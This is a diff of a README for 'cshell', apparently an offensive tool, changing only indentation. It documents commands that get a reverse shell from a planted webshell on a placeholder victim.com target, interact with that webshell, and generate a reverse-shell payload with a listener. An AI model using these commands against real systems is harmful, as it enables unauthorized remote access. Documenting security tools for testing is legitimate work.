@@ -39,13 +39,13 @@ lstnr   Generate payload, copy it to your clipboard and start a listener[Optiona
 ```
 
 - **Getting a reverse shell from a webshell :**   
-	- GET Method  : `cshell rev -i <Interface or IP. Example : 127.0.0.1 or lo> <Target URL with REV as command. Example : http://victim.com/webshell.php?cmd=REV>`  
-	- POST Method : `cshell rev -i <Interface or IP. Example : 127.0.0.1 or lo> -m POST -d <Post DATA in JSON format with REV as command. Example : '{"cmd" : "REV"}'> <Target URL. Example : http://victim.com/webshell.php>`  
+  - GET Method  : `cshell rev -i <Interface or IP. Example : 127.0.0.1 or lo> <Target URL with REV as command. Example : http://victim.com/webshell.php?cmd=REV>`  
+  - POST Method : `cshell rev -i <Interface or IP. Example : 127.0.0.1 or lo> -m POST -d <Post DATA in JSON format with REV as command. Example : '{"cmd" : "REV"}'> <Target URL. Example : http://victim.com/webshell.php>`  
 - **Interacting with a webshell** :   
-	- GET Method : `cshell web <Target URL with WEB as command. Example : http://victim.com/webshell.php?cmd=WEB>`  
-	- Post Method : `cshell rev -m POST -d <Post DATA in JSON format with WEB as command. Example : '{"cmd" : "WEB"}'> <Target URL. Example : http://victim.com/webshell.php>`  
+  - GET Method : `cshell web <Target URL with WEB as command. Example : http://victim.com/webshell.php?cmd=WEB>`  
+  - Post Method : `cshell rev -m POST -d <Post DATA in JSON format with WEB as command. Example : '{"cmd" : "WEB"}'> <Target URL. Example : http://victim.com/webshell.php>`  
 - **Generating a payload** :   
-	- `cshell lstnr -f <Format. Example : bash> -i <Interface or IP. Example : 127.0.0.1 or lo>  -p <Port. Example : 1337>`
+  - `cshell lstnr -f <Format. Example : bash> -i <Interface or IP. Example : 127.0.0.1 or lo>  -p <Port. Example : 1337>`
   
 
 ## Custom commands for WEB module : 
